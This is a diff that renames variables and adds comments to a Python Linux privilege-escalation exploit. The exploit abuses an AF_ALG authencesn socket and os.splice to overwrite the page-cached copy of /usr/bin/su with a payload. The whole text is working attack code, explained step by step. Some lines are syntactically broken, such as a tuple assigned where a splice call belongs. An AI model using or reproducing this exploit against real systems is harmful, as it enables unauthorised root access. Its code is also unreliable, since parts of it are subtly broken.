@@ -19,19 +19,19 @@ h = sockLevel
 v = sockOptObj
 u = client
 _ = addr
-o = o
-i = i
+o = offset
+i = zeros
 r,w = read, write
 n = n
 '''
 def c(file, index, byteData):
-    #Socket family=38 (AF_ALG), type=5 (SOCK_SEQPACKET) , protocol=0 (default)
+    #socket family=38 (AF_ALG), type=5 (SOCK_SEQPACKET) , protocol=0 (default)
     ALFSocket = socket.socket(38, 5, 0)
-    #Bind to authencesn AEAD template
+    #bind to authencesn AEAD template
     ALFSocket.bind(("aead",
                     "authencesn(hmac(sha256),cbc(aes))"))
 
-    sockLevel = 279 #Exploit uses socket level 279
+    sockLevel = 279 #exploit uses socket level 279
     sockOptObj = ALFSocket.setsockopt
     #level=279, optname=1 (ALG_SET_KEY), optval=bytes (key for authencesn)
     sockOptObj(sockLevel, 1, toBytes('0800010000000010'+'0'*64))
@@ -40,18 +40,23 @@ def c(file, index, byteData):
     
     client, addr = ALFSocket.accept()
     
-    o = index+4
-    i = toBytes('00')
+    offset = index+4 #increment by 4 bytes of payload
+    zeros = toBytes('00')
 
-    client.sendmsg([b"A"*4+byteData], [(sockLevel, 3, i*4),
-                                       (sockLevel,2,b'\x10'+i*19),
-                                       (sockLevel, 4, b'\x08'+i*3),
-                                       ], 32768)
+    #send payload, last AUTHSIZE (4) bytes are written (as seqno_lo)
+    client.sendmsg([b"A"*4+byteData],
+                   [(sockLevel, 3, zeros*4),
+                    (sockLevel,2,b'\x10'+zeros*19),
+                    (sockLevel, 4, b'\x08'+zeros*3),
+                    ], 32768)
     
     read, write = os.pipe()
-    n = g.slice
-    n = (file, write, o, offset_src=0)
-    n(read, client.fileno(), o)
+    n = os.splice #splice passes by reference
+    #splice /usr/bin/su to write
+    n = (file, write, offset, offset_src=0) 
+    #splice AF_ALG socket to read:
+    #the payload is written (4 bytes at a time) into the cached copy of su
+    n(read, client.fileno(), offset)
 
     try:
         client.recv(8+index)
